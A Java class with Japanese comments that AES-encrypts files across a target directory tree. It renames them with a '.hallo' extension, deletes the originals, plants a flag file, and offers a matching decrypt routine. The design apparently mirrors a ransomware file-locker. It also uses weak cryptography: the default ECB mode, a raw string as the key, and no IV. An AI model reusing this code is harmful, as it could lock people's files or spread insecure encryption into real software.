package cipher;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;

import static cipher.CryptionKeys.A_FLAG_FILE;

public class Cryption {

  /**
   * 共通鍵暗号化方式::AES でファイルを暗号化する
   *
   * @param fileInput  ファイル
   * @param commonKey  共通キーになる秘密キー (128 bit key)
   * @param fileOutput 暗号化されて排出されるファイル
   */
  private void fileCrypt(int cryptMode, String commonKey, File fileInput, File fileOutput) throws CryptionException {
    Key skeySpec;
    Cipher cipher;

    FileInputStream inputStream = null;
    FileOutputStream outputStream = null;

    try {
      // 暗号化ロジック
      skeySpec = new SecretKeySpec(commonKey.getBytes(), "AES");
      cipher = Cipher.getInstance("AES");
      cipher.init(cryptMode, skeySpec); // ここに 16byte の initVector 追加したかった

      // File IO
      inputStream = new FileInputStream(fileInput);
      byte[] inputBytes = new byte[(int) fileInput.length()];
      inputStream.read(inputBytes);

      byte[] outputBytes = cipher.doFinal(inputBytes);
      outputStream = new FileOutputStream(fileOutput);
      outputStream.write(outputBytes);

      // 暗号化 || 復号化が終わったら、元のファイルを削除する
      fileInput.delete();

    } catch (NoSuchAlgorithmException | NoSuchPaddingException
        | BadPaddingException | InvalidKeyException
        | IllegalBlockSizeException | IOException e) {

      // 違うメソッドで処理したいため
      throw new CryptionException(e.getMessage(), e);

    } finally {
      try {
        if (inputStream != null) inputStream.close();
        if (outputStream != null) outputStream.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  /**
   * ファイルリストを暗号化し、拡張子を変換する
   *
   * @param files       複数のファイル
   * @param rootDirPath ターゲットになる最上位ディレクトリ
   */
  public void exeEncrypt(List<File> files, String rootDirPath, String commonKey) {

    files.forEach(file -> {
      try {
        fileCrypt(Cipher.ENCRYPT_MODE, commonKey,
            file, new File(file.getPath() + ".hallo"));

        System.out.println("[log] 暗号化 完了");
      } catch (CryptionException e) {
        e.getMessage(); // TODO 詳細表示
        System.out.println("[log] 暗号化 失敗");
      }
    });


    // 暗号化が終わったら、フラグファイルを追加する
    FileOutputStream output = null;
    try {
      output = new FileOutputStream(rootDirPath + A_FLAG_FILE);
      System.out.println("[log] フラグ追加 完了");

    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      try {
        if (output != null) output.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  /**
   * ファイルリストを復号化し、フラグファイルを削除する
   *
   * @param halloedFiles 暗号化された複数のファイル
   * @param rootDirPath  ターゲットになる最上位ディレクトリ
   */
  public void exeDecrypt(List<File> halloedFiles, String rootDirPath, String commonKey) {

    halloedFiles.forEach(hallo -> {
      try {
        fileCrypt(Cipher.DECRYPT_MODE, commonKey,
            hallo, new File(hallo.getPath().split(".hallo")[0]));

        // 復号化が終わったら、フラグファイルを削除する
        File flag = new File(rootDirPath + A_FLAG_FILE);
        if (flag.exists()) {
          flag.delete();
          System.out.println("[log] フラグ削除 完了");
        }

        System.out.println("[log] 復号化 完了");

      } catch (CryptionException e) {
        e.getMessage(); // TODO 詳細表示
        System.out.println("[log] 復号化 失敗 -- フラグ残存");
      }
    });
  }

  /**
   * 該当ディレクトリの Encrypt 可否を判断する
   *
   * @param dirPath ディレクトリパス
   * @return flag file の存在可否
   */
  public boolean hasEncryptFlag(String dirPath) {
    File[] filesInDir = new File(dirPath).listFiles();
    return (filesInDir != null) && Arrays.stream(filesInDir)
        .anyMatch(file -> file.getName().equals(A_FLAG_FILE));
  }
}
